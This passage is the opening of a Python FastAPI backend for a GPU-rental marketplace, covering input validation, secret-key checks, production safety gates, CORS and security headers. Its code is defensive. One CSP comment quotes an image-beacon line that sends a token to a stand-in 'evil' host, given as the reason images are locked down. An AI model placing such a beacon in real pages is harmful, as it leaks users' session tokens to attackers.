from fastapi import (
    FastAPI, Depends, HTTPException, Query, Header, Security, Request, WebSocket,
    WebSocketDisconnect, Body, Form,
)
from fastapi.responses import PlainTextResponse, JSONResponse, Response, HTMLResponse, RedirectResponse
from fastapi.security import OAuth2PasswordRequestForm
from sqlalchemy.orm import Session
from sqlalchemy import text, func, case, or_, and_, distinct, cast, Float
from pydantic import BaseModel, Field, field_validator, model_validator
from contextlib import asynccontextmanager
from typing import Optional
from datetime import datetime, timezone, timedelta
from fastapi.middleware.cors import CORSMiddleware
import asyncio
import copy
import hashlib
import json
import logging
from decimal import Decimal
import os
import re
import secrets
import time

logger = logging.getLogger("petabyte")

# User-supplied display labels (GPU model, region, provider, country, username, org name)
# are rendered into other users' pages (marketplace, admin console, payout tables). They
# MUST NOT be able to carry HTML/JS: reject the metacharacters that make stored XSS
# (< > & " ' ` and control chars). We validate at WRITE time so a payload can never be
# stored — the single strongest lever, independent of how many render sinks exist. The
# allowed set covers every real GPU/region/provider label ("RTX 4090", "us-east-1",
# "H100 80GB", "self-hosted").
_SAFE_LABEL_RE = re.compile(r"^[\w .,\-/+:()#@]*$", re.UNICODE)


def _clean_label(v, *, field: str, maxlen: int = 64, required: bool = False):
    """Trim + charset-validate a user display label. Returns the cleaned value (or None)."""
    if v is None:
        if required:
            raise ValueError(f"{field} is required")
        return None
    v = str(v).strip()
    if required and not v:
        raise ValueError(f"{field} is required")
    if len(v) > maxlen:
        raise ValueError(f"{field} is too long (max {maxlen} characters)")
    if not _SAFE_LABEL_RE.match(v):
        raise ValueError(f"{field} contains invalid characters")
    return v


# SECRET_KEY signs every JWT (HS256). A placeholder that ships in the repo (template.env /
# .env.example) is publicly known, so anyone could forge tokens for any account, including admin —
# the production gate must reject it, not just a hand-picked shortlist. Both shipped placeholders are
# < 32 chars, so an explicit set plus a length floor catches them without false-positiving real keys.
_SECRET_KEY_PLACEHOLDERS = {
    "", "t", "dev", "change-me", "changeme", "secret", "secret-key",
    "change_me_openssl_rand_hex_32", "dev-only-change-me", "your-secret-key-here",
}


def _weak_secret_key(v: str) -> bool:
    s = (v or "").strip()
    return s.lower() in _SECRET_KEY_PLACEHOLDERS or len(s) < 32

# Observability: structured JSON logging + redaction, optional OTel tracing, and
# bounded-cardinality Prometheus metrics. Import-safe and degrade-safe — if the telemetry
# libs or the collector are absent the whole thing becomes a cheap no-op and the app runs
# unchanged (telemetry must never break payments or jobs).
import observability as obsmod  # noqa: E402
from observability import (  # noqa: E402
    obs, EVENTS, bind_context, get_context, new_request_id, sanitize_incoming_request_id,
    bounded_label,
)
obsmod.init_observability(obsmod.SERVICE.API)

from utils import (
    gen_wg_keypair, build_client_wg_config, apply_peer_to_interface,
    gen_secure_api_key, decode_api_key, verify_attestation, verify_signed_proof,
    seal_secret, open_secret,
    s3_put_bytes, s3_get_bytes, s3_delete, s3_exists,
)
import totp
from db import (
    D, q, qc, Money, BookingsPaused, SellerSpec, Booking, list_payout_methods, VMRoute, bookings_are_paused, set_bookings_paused, audit,
    start_email_verification, confirm_email, is_disposable_email, redact_destination,
    ensure_referral_code, apply_referral, _referral_amount,
    payout_method_is_cooled_off, AuditEvent, PAYOUT_COOLING_OFF_H, verify_password,
    EMAIL_TOKEN_TTL_MIN,
    get_db, SessionLocal, PLATFORM_TAKE_RATE, HEARTBEAT_TIMEOUT_S,
    create_user, login_user, get_user_by_username, set_role,
    save_specs, get_spec_by_id, spec_is_live, touch_spec, reap_stale_specs,
    create_vm_route, get_vm_route, vm_routes_for_buyer, register_vm_tunnel,
    stop_vm_route, failover_vm, reap_and_failover,
    stop_vm_metered, extend_vm, meter_and_expire, reprice_specs,
    try_reserve_unit, release_unit, create_booking, get_booking_by_id,
    revoke_jti, is_jti_revoked, add_wg_peer,
    record_issued_key, list_issued_keys, get_or_create_oauth_user,
    create_install_token, resolve_install_token,
    meter_data_call, usage_summary, record_price_snapshot, price_history, _live_price_index,
    data_api_revenue,
    idem_begin, idem_finish, idem_abort,
    create_task, claim_next_task, get_task_for_agent, mark_task_running,
    submit_task_result, get_booking_for_buyer,
    MIN_REPUTATION, create_test_task, get_testworkload_by_task,
    record_test_result, penalize_user, get_user_by_id, get_spec_by_id as _get_spec,
    deposit, try_debit, book_with_escrow, mark_booking_active,
    release_booking, refund_booking, settle_dead_specs, get_or_create_platform,
    webhook_already_processed, credit_user_by_username,
    create_challenge, consume_challenge, set_spec_confidential, spec_confidential_active,
    create_org, get_org, get_membership, org_members, add_org_member, list_orgs_for_user,
    set_org_member_role, remove_org_member,
    list_audit_for_actor, list_audit_for_org, verify_audit_chain,
    set_totp_secret, enable_totp, disable_totp, hash_backup_code, consume_backup_code,
    create_volume, get_volume, list_volumes, volume_blob_shas, volume_blob_exists,
    register_volume_blob, plan_snapshot, finalize_snapshot, list_snapshots, get_snapshot,
    restore_manifest, delete_volume,
    org_deposit, try_org_debit, org_refund, org_usage,
    retry_task, set_task_progress, add_task_log, get_task_logs,
    set_benchmark, create_benchmark_task, org_analytics,
    record_checkpoint, list_checkpoints, reschedule_task,
    get_or_create_task_enc_key,
    note_heartbeat, note_job_completed, note_job_failed, note_fraud,
    compute_reputation, recent_rep_events, trust_level_for,
    set_idle_fallback, record_idle_report, idle_credited_total,
    set_disk_rental, delete_disk_rental, record_disk_report, disk_credited_total,
    disk_node_name, DISK_PROVIDERS,
    set_spec_cached_models, spec_cached_models, specs_with_model_cached, rank_specs_for_model,
    add_payout_method, list_payout_methods, get_payout_method,
    request_payout, set_payout_status, list_payouts,
    withdrawable_earnings, is_payout_matured, EARNINGS_HOLD_HOURS, PAYOUT_MATURITY_MIN_JOBS,
    create_schedule, list_schedules, run_due_schedules,
    list_notifications,
    create_multinode_job, add_job_segment, segment_for_task, complete_segment,
    all_segments_done, segment_output_refs, set_job_status, get_multinode_job,
    job_segments,
    create_distributed_job, set_rendezvous, rendezvous_info, distributed_job_for_task,
    rank_for_agent, register_peer, cluster_peers, cluster_ready,
)
import db as dbmod
from auth import (create_access_token, verify_token,
                  SESSION_COOKIE, CSRF_COOKIE, SESSION_MAX_AGE)
# Shared FastAPI dependencies (auth + DB session) live in deps.py so domain routers can use
# them without importing main. Every Depends(...) below resolves to these same callables.
from deps import (oauth2_scheme, get_current_user, _username, api_key_user,  # noqa: F401
                  enforce_csrf)
from pages import (LANDING_HTML, INVESTORS_HTML, DEVELOPERS_HTML, INSTALL_HTML,
                   KEYS_HTML, MARKETPLACE_HTML, ADMIN_HTML, LOGIN_HTML, ACCOUNT_HTML,
                   NOTFOUND_HTML, RESET_HTML, FUNDING_VIEW_HTML, ROI_HTML, LAUNCH_HTML)
from web_routes import router as web_router     # static public pages (extracted router)
from trust_routes import router as trust_router  # trust/transparency API (extracted router)
from models_routes import router as models_router  # model hub: discover/pull/manage (extracted router)
from templates_registry import TEMPLATES, public_catalog, template_min_vram
from router import select_plan
from payout_providers import screen, get_provider
import notifications
RENDER_IMAGE = TEMPLATES['blender']['image']
# Image for the DEDICATED /transcode + /stitch job paths (NVENC/NVDEC). This is a job type, not a
# one-click launch template — running the bare image does nothing, so it's not in the catalog.
FFMPEG_IMAGE = "jrottenberg/ffmpeg:6.1-nvidia"
from utils import (
    verify_webhook_signature, verify_tee_report, geolocate_country,
    mint_presigned_put, mint_presigned_get, s3_key_for, s3_uri,
)

REAPER_INTERVAL_S = int(os.getenv("REAPER_INTERVAL_S", "20"))
REAPER_DISABLED = os.getenv("REAPER_DISABLED", "false").lower() == "true"
# TODO(stub): PAYMENTS_MODE=sandbox mints test credit on /deposit — go live via Stripe (stub.md #1)
PAYMENTS_MODE = os.getenv("PAYMENTS_MODE", "sandbox").lower()      # sandbox|live
# Self-scheduling for demos. When you've created a Cal.com account, set e.g.
# CAL_BOOKING_URL=https://cal.com/petabyte/demo — the demo flow then emails each
# requester this link and shows a "Pick your time" button so they book a slot that
# fits both calendars. Left blank, we fall back to "we'll email you within a day".
CAL_BOOKING_URL = os.getenv("CAL_BOOKING_URL", "").strip()

# Newsletter. NEWSLETTER_PROVIDER selects the backend:
#   mailgun   -> add the signup to the Mailgun mailing list at NEWSLETTER_LIST_ADDRESS
#                (reuses MAILGUN_API_KEY; From/Reply-To are configured on the list in Mailgun,
#                not here — the sending subdomain is implied by the list address).
#   mailchimp -> legacy Mailchimp audience (MAILCHIMP_API_KEY + MAILCHIMP_AUDIENCE_ID).
#   none/blank -> the form returns an honest "not wired up yet" message (no dead POST).
NEWSLETTER_PROVIDER = os.getenv("NEWSLETTER_PROVIDER", "mailgun").strip().lower()
NEWSLETTER_LIST_ADDRESS = os.getenv("NEWSLETTER_LIST_ADDRESS", "").strip()
# Legacy Mailchimp (only used when NEWSLETTER_PROVIDER=mailchimp). The API key ends with a
# datacenter suffix like "-us21"; we use that suffix for the API host.
MAILCHIMP_API_KEY = os.getenv("MAILCHIMP_API_KEY", "").strip()
MAILCHIMP_AUDIENCE_ID = os.getenv("MAILCHIMP_AUDIENCE_ID", "").strip()
# Fallback video shown until an admin sets one in the panel (your Short's ID).
DEFAULT_LANDING_VIDEO_ID = os.getenv("DEFAULT_LANDING_VIDEO_ID", "UUSWYaxboDA").strip()
BASE_DOMAIN = os.getenv("BASE_DOMAIN", "petabyte.market")          # for stable VM URLs
# Per-VM subdomain zone for the hostname-routed SSH/HTTP form (root@<id>.<zone>). Defaults to
# BASE_DOMAIN (so <id>.petabyte.market, unchanged); set to e.g. "vm.petabyte.market" to put every
# VM under one wildcard record. See docs/dynamic_dns.md for the DNS setup.
VM_DNS_ZONE = os.getenv("VM_DNS_ZONE", BASE_DOMAIN)

# The passwords attackers try first. A full HIBP k-anonymity check is the right next
# step (it needs an outbound call); this blocks the ones that get guessed in seconds.
COMMON_PASSWORDS = {
    "password", "password1", "password123", "passw0rd", "123456", "12345678",
    "123456789", "1234567890", "qwerty", "qwerty123", "letmein", "welcome",
    "welcome123", "admin", "admin123", "iloveyou", "abc123", "monkey", "dragon",
    "football", "baseball", "sunshine", "princess", "trustno1", "changeme",
    "passsword", "p@ssw0rd", "qwertyuiop", "1q2w3e4r", "zaq12wsx", "letmein123",
}
GATEWAY_TOKEN = os.getenv("GATEWAY_TOKEN", "")                     # gateway -> /vm/{id}/route auth
PAYMENT_WEBHOOK_SECRET = os.getenv("PAYMENT_WEBHOOK_SECRET", "")
AWS_REFERENCE_PRICE = os.getenv("AWS_REFERENCE_PRICE", "12.29")

# Per-GPU-class on-demand cloud reference rates + the fair like-for-like lookup live in
# pricing_engine (shared by the marketplace savings figures, the auto-price batch, and the
# recommendation endpoint so there is ONE reference table, no drift). A savings claim is only
# honest LIKE FOR LIKE — where we don't recognise the GPU, cloud_reference_for returns None and
# we show NO savings figure rather than an invented one.
from pricing_engine import CLOUD_REFERENCE, cloud_reference_for  # noqa: E402,F401


METRIC_DEFINITIONS = {
    "gmv": "Gross merchandise value: sum of gross_amount over RELEASED (settled) "
           "bookings in the window. Escrowed/refunded bookings are excluded.",
    "platform_revenue": "Sum of platform_fee (the take rate) over released bookings.",
    "seller_payouts": "Sum of seller_payout (gross minus fee) over released bookings.",
    "effective_take_rate_pct": "platform_revenue / gmv, as a percent. Should track the "
                               "configured PLATFORM_TAKE_RATE.",
    "utilization_pct": "Busy units / total units across all listed specs.",
    "available_gpu_hours": "Free units x each online node's rentable window — a capacity proxy.",
    "booked_gpu_hours": "Sum of booked hours over released bookings.",
    "buyer_savings_vs_cloud": "For each released booking on a GPU with a known cloud "
                              "reference, (cloud_ref - price) x hours. No reference -> not counted.",
    "completion_rate_pct": "completed / (completed + failed) over BUYER compute jobs "
                           "(benchmark/test probes excluded).",
    "median_time_to_start_s": "Median seconds from booking creation to the job task "
                              "appearing — a startup-latency proxy.",
    "repeat_buyers": "Buyers with more than one booking in the window.",
    "contains_demo_data": "True when the numbers include seeded demo entities. Demo "
                          "and real data are separable via scope=demo|real.",
}


# ---------------------------------------------------------------------------
# Periodic maintenance.
#
# TWO failure modes this guards against:
#  1. Gunicorn runs 4 workers. Without a lock, all 4 run the reaper every 20s --
#     four processes racing to fail over the same node, settle the same booking,
#     reprice the same listing. The operations are individually idempotent, but the
#     contention and duplicate notifications are real. So exactly ONE process holds
#     a Postgres advisory lock and does the work; the others no-op.
#  2. `except Exception: pass` meant maintenance could be dead for weeks while the
#     API cheerfully reported healthy. Now every failure is logged and the last
#     success timestamp is exposed on /health/ready so it can be alerted on.
#
# Long term this belongs in a separate `petabyte-scheduler` process (see
# deploy/lumaris-reaper.service). The lock makes it correct either way.
# ---------------------------------------------------------------------------
_MAINTENANCE_LOCK_ID = 918273645          # arbitrary, but must be stable
_maintenance = {"last_success": None, "failures": 0, "holder": False}


def _try_acquire_maintenance_lock(db) -> bool:
    """Session-scoped advisory lock. Only one process wins. SQLite has no advisory
    locks and no concurrent writers to protect against, so it always wins there."""
    if not db.bind.dialect.name.startswith("postgres"):
        return True
    try:
        return bool(db.execute(text("SELECT pg_try_advisory_lock(:i)"),
                               {"i": _MAINTENANCE_LOCK_ID}).scalar())
    except Exception:
        logger.exception("maintenance: advisory lock check failed")
        return False


def _maintenance_cycle() -> None:
    db = SessionLocal()
    try:
        if not _try_acquire_maintenance_lock(db):
            _maintenance["holder"] = False
            return                       # another worker owns maintenance
        _maintenance["holder"] = True
        # Ephemeral sellers: detect offline from heartbeat EXPIRY. Count the specs about to
        # be reaped so the transition is observable (history survives the GPU going away).
        try:
            from db import _utcnow as _now_fn
            _cut = _now_fn() - timedelta(seconds=HEARTBEAT_TIMEOUT_S)
            _stale_n = db.query(SellerSpec).filter(
                SellerSpec.status == "online", SellerSpec.last_seen < _cut).count()
        except Exception:  # noqa: BLE001
            _stale_n = 0
        reap_and_failover(db, HEARTBEAT_TIMEOUT_S)  # migrate live VMs off dead nodes
        if _stale_n:
            obsmod.inc_metric("petabyte_sellers_reaped_total", _stale_n,
                              environment=obsmod.ENVIRONMENT)
            obs.event(EVENTS.SELLERS_REAPED, message="stale sellers reaped offline",
                      count=_stale_n, timeout_s=HEARTBEAT_TIMEOUT_S)
        settle_dead_specs(db)            # refund in-flight bookings on dead nodes
        meter_and_expire(db)             # auto-stop VMs whose prepaid window ended
        try:
            # release GPU units held by abandoned/failed compute-tx reservations (the buyer
            # cancel path can't release a dispatched tx, so a post-dispatch failure would
            # otherwise leak its unit forever).
            import stripe_connect as _sc_reclaim
            _sc_reclaim.reclaim_abandoned_reservations(db)
        except Exception:  # noqa: BLE001 — never let cleanup break the maintenance cycle
            logger.exception("reclaim_abandoned_reservations cycle failed")
        reprice_specs(db)                # demand-based auto-pricing for opted-in nodes
        try:
            reconcile_newsletter(db, limit=50)   # deliver any deferred newsletter signups
        except Exception:  # noqa: BLE001 — a mailing-list hiccup must not break maintenance
            logger.exception("newsletter reconcile cycle failed")
        try:
            # data-API price history: capture one index snapshot every DATA_SNAPSHOT_INTERVAL_S.
            if time.time() - _maintenance.get("last_snapshot", 0.0) >= DATA_SNAPSHOT_INTERVAL_S:
                record_price_snapshot(db)
                _maintenance["last_snapshot"] = time.time()
        except Exception:  # noqa: BLE001 — a snapshot hiccup must not break maintenance
            logger.exception("price snapshot cycle failed")
        _maintenance["last_success"] = time.time()
    finally:
        db.close()


async def _reaper_loop():
    while True:
        await asyncio.sleep(REAPER_INTERVAL_S)
        try:
            _maintenance_cycle()
        except asyncio.CancelledError:
            raise
        except Exception:
            # NEVER silently. A dead maintenance loop is a silent money bug:
            # nodes stay listed, VMs never expire, bookings never settle.
            _maintenance["failures"] += 1
            logger.exception("maintenance cycle failed (failures=%s)",
                             _maintenance["failures"])


# ---------------------------------------------------------------------------
# Production safety gate.
#
# Every stub here exists so the thing is testable. Every one of them, left on in
# production, silently converts a security property into a demo:
#   GOOGLE_OAUTH_STUB -> anyone can log in as anyone
#   PAYOUT_STUB       -> withdrawals "succeed" and pay nobody
#   PAYMENTS_MODE     -> sandbox mints free credit
#   S3_STUB           -> snapshots aren't stored; failover restores nothing
#   LEGACY_KEYS_...   -> a scopeless API key is root
# Fail loudly at boot rather than quietly at the first customer.
# ---------------------------------------------------------------------------
def _is_real_deployment() -> bool:
    """True if this served process shows ANY unambiguous sign of being a real deployment —
    not merely when someone remembered to set ENVIRONMENT=production. A deploy that FORGETS
    that flag must still fail closed on dangerous stubs, so live-money signals also trigger
    the gate. (TEST-mode E2E — real Stripe with sk_test_ keys — is intentionally NOT a signal,
    so it can still run stubs like S3_STUB in a non-production context.)"""
    if os.getenv("ENVIRONMENT", "development").strip().lower() == "production":
        return True
    if os.getenv("PAYMENTS_LIVE_ENABLED", "").strip().lower() == "true":
        return True                                   # deliberate live-money opt-in
    if os.getenv("STRIPE_SECRET_KEY", "").strip().startswith("sk_live_"):
        return True                                   # a LIVE key is present — this is prod
    return False


def _assert_production_is_safe() -> None:
    if not _is_real_deployment():
        return
    unsafe = {
        "GOOGLE_OAUTH_STUB": os.getenv("GOOGLE_OAUTH_STUB", "").lower() == "true",
        "PAYOUT_STUB": os.getenv("PAYOUT_STUB", "").lower() == "true",
        "S3_STUB": os.getenv("S3_STUB", "").lower() == "true",
        "LEGACY_KEYS_FULL_ACCESS": LEGACY_KEYS_ARE_FULL_ACCESS,
        "PAYMENTS_MODE=sandbox": PAYMENTS_MODE != "live",
        # The manifest/template default is STRIPE_GATEWAY=fake; a production process must run the
        # REAL gateway regardless of PAYMENTS_LIVE_ENABLED, or it would serve real customers with
        # the in-process fake (no money moves). This early gate fails closed on fake/unset/typo.
        "STRIPE_GATEWAY is not 'real'":
            os.getenv("STRIPE_GATEWAY", "").strip().lower() != "real",
        "SECRET_KEY is a default/dev/placeholder value (or < 32 chars)":
            _weak_secret_key(os.getenv("SECRET_KEY", "")),
    }
    enabled = [k for k, v in unsafe.items() if v]
    if enabled:
        raise RuntimeError(
            "Refusing to start: this looks like a real deployment (ENVIRONMENT=production, "
            "PAYMENTS_LIVE_ENABLED=true, or a live Stripe key present) but unsafe settings are "
            "enabled: " + ", ".join(enabled) + ". Fix these before serving real traffic.")

    # Live payments require the FULL real configuration; fail safe otherwise. This is the
    # "no half-configured live mode" gate: PAYMENTS_LIVE_ENABLED=true must come with real
    # keys, a webhook secret, and the real gateway — never a fake fallback for money.
    if os.getenv("PAYMENTS_LIVE_ENABLED", "").lower() == "true":
        missing = [k for k in ("STRIPE_SECRET_KEY", "STRIPE_PUBLISHABLE_KEY",
                               "STRIPE_WEBHOOK_SECRET") if not os.getenv(k)]
        if os.getenv("STRIPE_GATEWAY", "").strip().lower() != "real":
            missing.append("STRIPE_GATEWAY=real")
        if missing:
            raise RuntimeError(
                "PAYMENTS_LIVE_ENABLED=true but live payments are not fully configured: "
                "missing " + ", ".join(missing) + ". Refusing to start half-live.")


def _assert_gateway_explicit() -> None:
    """A SERVED API process must CHOOSE its payment gateway explicitly.

    Silently defaulting to the in-process FakeStripeGateway (which is what happens when
    STRIPE_GATEWAY is unset) once minted a fake Connect account (``acct_fake…``) inside a real
    TEST database, then blocked the real account from ever being created. So: require
    STRIPE_GATEWAY to be ``real`` or ``fake``. The only way to run without setting it is to
    declare an offline self-test context (``PETABYTE_OFFLINE_TEST=1``), which pins the fake
    gateway loudly. Fail closed otherwise — never move (or pretend to move) money on a default.

    This runs from the lifespan, i.e. only when the app is actually SERVED (uvicorn). Unit
    tests instantiate a bare ``TestClient(app)`` without entering the lifespan, so they are
    unaffected; the offline load harness sets STRIPE_GATEWAY=fake explicitly."""
    gw = os.getenv("STRIPE_GATEWAY", "").strip().lower()
    if gw in ("real", "fake"):
        return
    # A NON-EMPTY but unrecognized value (e.g. a typo) is a config error — never let the offline
    # override mask it. The offline override applies ONLY when STRIPE_GATEWAY is unset.
    if gw:
        raise RuntimeError(
            f"STRIPE_GATEWAY={gw!r} is not a valid gateway. Set STRIPE_GATEWAY=real or "
            "STRIPE_GATEWAY=fake. Refusing to start on an unrecognized gateway value.")
    # STRIPE_GATEWAY is unset. Validate PETABYTE_OFFLINE_TEST against the DOCUMENTED value set
    # (unset/0/1/true/false); only '1'/'true' enable the offline fake gateway.
    offline_raw = os.getenv("PETABYTE_OFFLINE_TEST", "").strip().lower()
    _OFFLINE_VALID = ("", "0", "1", "true", "false")
    if offline_raw not in _OFFLINE_VALID:
        raise RuntimeError(
            f"PETABYTE_OFFLINE_TEST={offline_raw!r} is invalid. Use one of "
            f"{list(_OFFLINE_VALID)} — only '1'/'true' enable the offline fake gateway.")
    offline_on = offline_raw in ("1", "true")
    is_production = os.getenv("ENVIRONMENT", "development").strip().lower() == "production"
    if offline_on and is_production:
        raise RuntimeError(
            "PETABYTE_OFFLINE_TEST is enabled in production. The offline fake gateway is NEVER "
            "allowed in production — set STRIPE_GATEWAY=real and unset PETABYTE_OFFLINE_TEST.")
    if offline_on:
        os.environ["STRIPE_GATEWAY"] = "fake"
        logger.warning("PETABYTE_OFFLINE_TEST enabled with STRIPE_GATEWAY unset -> pinning the "
                       "offline FakeStripeGateway for this self-test process (no real money).")
        return
    raise RuntimeError(
        "STRIPE_GATEWAY is not set. A served Petabyte API must choose its payment gateway "
        "EXPLICITLY: STRIPE_GATEWAY=real (real Stripe — TEST or LIVE per your keys) or "
        "STRIPE_GATEWAY=fake (offline, no money). Refusing to silently fall back to the fake "
        "gateway; that once minted a fake Connect account in a real TEST database. For "
        "NON-production offline self-tests set PETABYTE_OFFLINE_TEST=1.")


@asynccontextmanager
async def lifespan(app: FastAPI):
    _assert_production_is_safe()
    # No silent fake money: a served process must pick real|fake explicitly (see above).
    _assert_gateway_explicit()
    # Hard-fail at boot if a LIVE Stripe key is present without the deliberate
    # production opt-in — no silent live mode, ever.
    from stripe_gateway import assert_test_mode
    assert_test_mode()
    task = None if REAPER_DISABLED else asyncio.create_task(_reaper_loop())
    yield
    if task:
        task.cancel()


API_DESCRIPTION = """
Rent verified GPU compute by the hour, or earn from hardware you already own.

**Authentication.** Every request needs an API key: `X-API-KEY: pk_...` (create one at
/keys), or a bearer token from `/login` for browser sessions.

**Typical buyer flow.** Fund your wallet -> `POST /launch` a template on the cheapest
verified node -> connect at the address returned -> `POST /vm/{id}/stop` when done.
You are billed for the hours you actually hold the machine; the unused prepay is refunded.

**Typical seller flow.** Install the agent -> it attests your hardware and heartbeats ->
your GPU appears in the marketplace -> earnings accrue per completed rental.

Money is held in escrow for the duration of a rental and released on completion. If a node
dies mid-rental, the VM fails over to another node at the same address, or you are refunded.
"""

app = FastAPI(
    title="Petabyte API",
    version="1.0.0",
    description=API_DESCRIPTION,
    lifespan=lifespan,
    docs_url=None,      # replaced by Scalar at /docs
    redoc_url=None,
    openapi_tags=[
        {"name": "compute", "description": "Launch, extend, and stop GPU machines."},
        {"name": "marketplace", "description": "Browse live verified inventory. No auth required."},
        {"name": "wallet", "description": "Deposits, balance, withdrawals, payout methods."},
        {"name": "seller", "description": "List hardware, prove it, track earnings."},
        {"name": "account", "description": "Registration, login, API keys."},
    ],
)

# Error tracking — active only when SENTRY_DSN is set and SENTRY_ENABLED != false.
# Correlated with our traces (environment + release), PII off, and every event scrubbed
# through the same redaction policy as our logs so no secret/card/token can leak upstream.
_SENTRY_DSN = os.getenv("SENTRY_DSN", "").strip()
if _SENTRY_DSN and os.getenv("SENTRY_ENABLED", "true").strip().lower() != "false":
    try:
        import sentry_sdk

        def _sentry_scrub(evt, _hint):
            try:
                return obsmod.redact(evt)
            except Exception:  # noqa: BLE001
                return evt

        sentry_sdk.init(
            dsn=_SENTRY_DSN,
            environment=obsmod.ENVIRONMENT,
            release=obsmod.RELEASE,
            traces_sample_rate=obsmod._f("SENTRY_TRACES_SAMPLE_RATE", 0.1),
            profiles_sample_rate=obsmod._f("SENTRY_PROFILES_SAMPLE_RATE", 0.0),
            send_default_pii=False,
            max_breadcrumbs=int(os.getenv("SENTRY_MAX_BREADCRUMBS", "30")),
            before_send=_sentry_scrub,
        )
        sentry_sdk.set_tag("service", obsmod.SERVICE.API)
    except Exception as _e:  # noqa: BLE001
        import logging as _lg
        _lg.getLogger(__name__).warning(f"Sentry init skipped: {_e}")

# CORS: explicit allow-list only (never "*" with credentials). Set ALLOWED_ORIGINS
# to a comma-separated list, e.g. "https://petabyte.market,https://app.petabyte.market".
_origins = [o.strip() for o in os.getenv("ALLOWED_ORIGINS", "").split(",") if o.strip()]
# A wildcard "*" combined with allow_credentials=True is a credentialed-wildcard CORS hole
# (Starlette reflects the caller's Origin with Allow-Credentials: true). Refuse it: an operator
# who writes ALLOWED_ORIGINS="*" gets no CORS rather than a cross-site credential leak.
if "*" in _origins:
    logging.getLogger("petabyte").warning(
        "ALLOWED_ORIGINS contains '*' — ignoring it: a credentialed wildcard is unsafe. "
        "List explicit origins instead.")
    _origins = [o for o in _origins if o != "*"]
if _origins:
    app.add_middleware(
        CORSMiddleware,
        allow_origins=_origins,
        allow_credentials=True,
        allow_methods=["GET", "POST"],
        allow_headers=["Authorization", "Content-Type", "X-API-KEY", "Idempotency-Key"],
    )


# ---------------------------------------------------------------------------
# Request IDs + security headers.
# Every response carries an X-Request-ID that also appears in our logs, so a user
# can quote it and we can find the exact request. Headers are set here (not nginx)
# so they hold no matter what fronts the app.
# ---------------------------------------------------------------------------
def _route_label(request: Request) -> str:
    """Bounded route label for metrics. Prefer the matched route template, else collapse
    id-like segments so cardinality stays bounded."""
    route = request.scope.get("route")
    tmpl = getattr(route, "path", None)
    return tmpl if tmpl else obsmod.bounded_route(request.url.path)


def _dec_in_flight():
    obsmod.dec_metric("petabyte_http_in_flight_requests", environment=obsmod.ENVIRONMENT)


def _safe_path(request: Request) -> str:
    """Request path safe for logging. JSON logging escapes control chars structurally, so
    the raw path is kept there for correlation; for plain-text logging we strip C0 control
    chars (incl. a decoded %0A/%0D) so an attacker-controlled path can't forge a log line."""
    p = request.url.path
    if obsmod.LOG_FORMAT == "json":
        return p
    return "".join(ch for ch in p if ch >= " " and ch != "\x7f")


@app.middleware("http")
async def _request_context(request: Request, call_next):
    # Accept a caller-supplied id only after validation; otherwise mint one.
    rid = sanitize_incoming_request_id(request.headers.get("X-Request-ID")) or new_request_id()
    request.state.request_id = rid
    method = request.method
    # CSRF for ambient cookie sessions is enforced inside the AUTH dependency (deps.enforce_csrf,
    # invoked by get_current_user / seller_actor when auth came from the cookie) — so it applies
    # exactly to session-protected endpoints and never to public/webhook routes.
    start = time.time()
    obsmod.inc_metric("petabyte_http_in_flight_requests", environment=obsmod.ENVIRONMENT)
    # A SERVER span parented on the incoming W3C trace context (browser/edge), so a single
    # trace spans browser -> API -> downstream. No-op if OTel is inactive.
    try:
        with obs.span("http.request", kind="server", carrier=dict(request.headers)):
            bind_context(request_id=rid)
            response = await call_next(request)
    except Exception:
        _dec_in_flight()
        obsmod.inc_metric("petabyte_http_requests_total", method=method,
                          route=_route_label(request), status_class="5xx",
                          environment=obsmod.ENVIRONMENT)
        obs.event(EVENTS.UNHANDLED_EXCEPTION, level=logging.ERROR,
                  message="unhandled error", route=_route_label(request), method=method)
        logger.exception("unhandled error request_id=%s path=%s", rid, _safe_path(request))
        raise
    _dec_in_flight()
    # record request metrics with BOUNDED labels (route template / collapsed ids)
    route = _route_label(request)
    dur = time.time() - start
    sc = response.status_code
    status_class = f"{sc // 100}xx"
    obsmod.inc_metric("petabyte_http_requests_total", method=method, route=route,
                      status_class=status_class, environment=obsmod.ENVIRONMENT)
    obsmod.observe_metric("petabyte_http_request_duration_seconds", dur,
                          method=method, route=route, environment=obsmod.ENVIRONMENT)
    # Log an event only for non-2xx or slow requests (keeps Loki volume bounded); the
    # metric above covers the happy path. Business ids live in the context, never as labels.
    if sc >= 400 or dur > 2.0:
        obs.event(EVENTS.HTTP_REQUEST,
                  level=logging.WARNING if sc >= 500 else logging.INFO,
                  message=f"{method} {route} -> {sc}", route=route, method=method,
                  status_code=sc, duration_ms=round(dur * 1000, 1))
    # expose the trace id to support (safe, non-secret) for cross-referencing
    _tid = get_context().get("trace_id")
    if _tid:
        response.headers["X-Trace-Id"] = _tid
    # Referral attribution: if the visitor arrived with ?ref=CODE on ANY page, remember it
    # in a cookie so it survives leaving and coming back (people rarely sign up on the first
    # click). Signup reads this as a fallback. First-touch wins: don't overwrite an existing
    # cookie, so the original referrer keeps the credit.
    _ref = request.query_params.get("ref")
    if _ref and 4 <= len(_ref) <= 16 and _ref.isalnum() and not request.cookies.get("pb_ref"):
        response.set_cookie("pb_ref", _ref.upper(), max_age=60*60*24*90,  # 90 days
                            samesite="lax", httponly=False, path="/",
                            secure=(request.url.scheme == "https"))
    response.headers["X-Request-ID"] = rid
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"
    if request.url.scheme == "https":
        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    # CSP: our pages use inline <script>/<style>, so 'unsafe-inline' is required for
    # now. TODO(security): move page JS/CSS to static files with a nonce and drop it.
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; "
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; "
        "font-src 'self' https://fonts.gstatic.com; "
        # img-src is 'self' data: only (no blanket https:): all images are local (/static) or inline
        # SVG/data URIs, so this removes the `new Image().src='https://evil/?t='+token` beacon channel
        # that an injected script could otherwise use to exfiltrate data past connect-src 'self'.
        "img-src 'self' data:; "
        "connect-src 'self'; "
        # Allow the landing-page YouTube embed to load. Without an explicit frame-src, CSP
        # falls back to default-src 'self' and the browser blocks the iframe ("content
        # blocked"). This lists only YouTube's embed hosts, nothing else.
        "frame-src https://www.youtube.com https://www.youtube-nocookie.com; "
